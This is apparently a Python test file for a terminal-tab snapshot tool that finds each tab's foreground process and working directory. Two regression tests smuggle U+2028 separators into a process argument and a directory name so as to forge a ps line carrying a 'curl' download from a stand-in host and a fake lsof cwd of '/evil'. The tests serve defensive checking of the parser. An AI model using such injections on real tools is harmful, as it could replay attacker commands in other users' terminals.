"""Which process a tab is 'running' decides the whole snapshot.

Pure data in, pure data out: Proc is a plain dataclass that foreground_proc
consumes directly, so these drive the real call site with no subprocess.
"""

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from runner import run

from agent_tabs import procs

AGENTS = frozenset({"claude", "codex", "grok"})


def chain(*commands: str) -> list[procs.Proc]:
    """A login -> shell -> ... parent chain on one tty."""
    out = []
    for i, command in enumerate(commands):
        out.append(procs.Proc(100 + i, 99 + i, "ttys001", command))
    return out


def test_priority_agent_beats_its_own_deeper_child():
    # codex spawns node_repl; without the priority set the child wins and the
    # tab looks like an unknown command instead of a resumable codex session.
    got = procs.foreground_proc(
        chain("/usr/bin/login -fpl me", "-zsh", "codex resume", "node_repl"), AGENTS
    )
    assert got.argv0 == "codex", got.command


def test_claude_beats_a_caffeinate_child():
    got = procs.foreground_proc(chain("-zsh", "claude", "caffeinate -i -t 300"), AGENTS)
    assert got.argv0 == "claude", got.command


def test_deepest_non_shell_wins_when_no_agent_present():
    got = procs.foreground_proc(chain("-zsh", "ssh host", "vim"), AGENTS)
    assert got.argv0 == "vim", got.command


def test_falls_back_to_the_shell_when_everything_is_a_shell():
    got = procs.foreground_proc(chain("/usr/bin/login -fpl me", "-zsh"), AGENTS)
    assert got is not None and got.is_shell


def test_empty_tty_gives_nothing():
    assert procs.foreground_proc([], AGENTS) is None


def test_parent_cycle_does_not_hang():
    # A recycled pid can make the parent chain loop; the guard must survive it.
    a = procs.Proc(10, 11, "ttys001", "vim")
    b = procs.Proc(11, 10, "ttys001", "less")
    got = procs.foreground_proc([a, b], AGENTS)
    assert got in (a, b)


def test_tty_normalisation_matches_ps_and_iterm_forms():
    assert procs.normalise_tty("/dev/ttys003") == procs.normalise_tty("ttys003")


def test_a_line_separator_in_argv_cannot_forge_a_process():
    # ps escapes a newline in argv but passes U+2028 through, and splitlines()
    # splits on it: the rest of the argument parses as a whole process line,
    # with its own tty field. Any process of any user, even one with no
    # terminal, could plant a command on another tab's tty that restore would
    # replay there. Real ps, real process: the mechanism is ps's output format.
    import subprocess
    import time

    forged = "ttys777 curl -o /tmp/p http://example.invalid/p"
    holder = subprocess.Popen(
        [sys.executable, "-c", "import time; time.sleep(30)", f"x\u20289999 1 {forged}"]
    )
    try:
        for _ in range(50):
            raw = subprocess.run(
                ["ps", "-o", "command=", "-p", str(holder.pid)],
                capture_output=True,
                text=True,
                encoding="utf-8",
                errors="replace",
            ).stdout
            if forged in raw:
                break
            time.sleep(0.1)
        else:
            raise AssertionError("setup: ps never showed the holder's argument")
        # The hazard is real here: ps passes the separator through unescaped.
        assert "\u2028" in raw, "setup: this ps escapes U+2028, so nothing is tested"
        fakes = [p for p in procs.process_table() if p.tty.endswith("ttys777")]
        assert not fakes, f"a forged process was parsed: {fakes}"
    finally:
        holder.kill()


def test_a_line_separator_in_a_path_cannot_forge_lsof_records():
    # lsof -F escapes a newline in a path but passes U+2028 through. A
    # directory named "x<U+2028>p<pid><U+2028>n/evil" would otherwise tell
    # cwd_of that another process works in /evil, and restore would cd there.
    # Real lsof, real processes.
    import subprocess
    import tempfile
    import time

    decoy = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(30)"])
    with tempfile.TemporaryDirectory() as tmp:
        odd = Path(tmp) / f"x\u2028p{decoy.pid}\u2028n/evil"
        odd.parent.mkdir(parents=True, exist_ok=True)
        odd.mkdir()
        holder = subprocess.Popen(
            [sys.executable, "-c", "import time; f = open('held'); time.sleep(30)"],
            cwd=str(odd),
        )
        (odd / "held").write_text("")
        try:
            for _ in range(50):
                cwds = procs.cwd_of([holder.pid, decoy.pid])
                if holder.pid in cwds:
                    break
                time.sleep(0.1)
            else:
                raise AssertionError("setup: lsof never reported the holder's cwd")
            assert "\u2028" in cwds[holder.pid], "setup: this lsof escapes U+2028"
            assert cwds.get(decoy.pid) != "/evil", f"a forged cwd was parsed: {cwds}"
            assert cwds[holder.pid].endswith("n/evil"), "the path was cut at the separator"
            for _ in range(50):
                held = [f for f in procs.open_files(holder.pid) if f.endswith("held")]
                if held:
                    break
                time.sleep(0.1)
            assert held and "\u2028" in held[0], f"open_files split the path: {held}"
        finally:
            holder.kill()
            decoy.kill()


if __name__ == "__main__":
    raise SystemExit(run(globals()))
